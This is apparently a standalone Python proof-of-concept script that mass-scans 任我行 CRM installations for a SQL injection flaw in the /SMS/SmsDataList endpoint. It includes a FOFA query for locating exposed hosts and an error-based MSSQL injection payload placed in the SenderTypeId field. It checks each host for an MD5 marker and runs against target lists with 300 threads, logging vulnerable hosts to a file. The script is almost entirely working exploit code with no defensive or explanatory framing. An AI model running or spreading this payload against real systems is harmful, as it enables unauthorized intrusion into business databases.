# FOFA语法：“欢迎使用任我行CRM”
import requests,argparse,time
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings() # 解除警告
GREEN = '\033[92m'
RESET = '\033[0m'
proxies = { 
       "http": "http://127.0.0.1:8080", 
       "https": "http://127.0.0.1:8080" 
       }
def banner():
	banner = """

	██████╗██╗  ██╗ ██████╗ ███████╗███████╗███╗   ██╗ ██╗
██╔════╝██║  ██║██╔═══██╗██╔════╝██╔════╝████╗  ██║███║
██║     ███████║██║   ██║███████╗█████╗  ██╔██╗ ██║╚██║
██║     ██╔══██║██║   ██║╚════██║██╔══╝  ██║╚██╗██║ ██║
╚██████╗██║  ██║╚██████╔╝███████║███████╗██║ ╚████║ ██║
 ╚═════╝╚═╝  ╚═╝ ╚═════╝ ╚══════╝╚══════╝╚═╝  ╚═══╝ ╚═╝
                                     info:任我行 CRM SmsDataList SQL注入漏洞
	"""
	print(banner)
def poc(target):
	payload_url = "/SMS/SmsDataList/?pageIndex=1&pageSize=30"
	url = target + payload_url
	headers={
		"Content-Type": "application/x-www-form-urlencoded"
	}
	data="Keywords=&StartSendDate=2020-06-17&EndSendDate=2020-09-17&SenderTypeId=0000000000'and 1=convert(int,(sys.fn_sqlvarbasetostr(HASHBYTES('MD5','123456')))) AND 'CvNI'='CvNI"

	try:
		res = requests.get(url=target,verify=False)
		res1 = requests.post(url=url,headers=headers,data=data,verify=False)
		if res.status_code == 200:
			if res1.status_code == 200 and "0xe10adc3949ba59abbe56e057f20f883e" in res1.text:
				print(f"{GREEN}[+]该url存在SQL注入漏洞：{target}{RESET}")
				with open("result.txt","a",encoding="utf-8") as f:
					f.write(target+"\n")
			else:
				print(f"[-]该url不存在SQL注入漏洞：{target}")
		else:
			print(f"该url连接失败：{target}")
	except:
		print(f"[*]该url出现错误：{target}")

def main():
	banner()
	parser = argparse.ArgumentParser()
	parser.add_argument("-u","--url",dest="url",type=str,help="please write link")
	parser.add_argument("-f","--file",dest="file",type=str,help="please write file\'path")
	args = parser.parse_args()
	if args.url and not args.file:
		poc(args.url)
	elif args.file and not args.url:
		url_list = []
		with open(args.file,"r",encoding="utf-8") as f:
			for i in f.readlines():
				url_list.append(i.strip().replace("\n",""))
		mp = Pool(300)
		mp.map(poc,url_list)
		mp.close()
		mp.join()
	else:
		print(f"\n\tUage:python {sys.argv[0]} -h")


if __name__ == "__main__":
	main()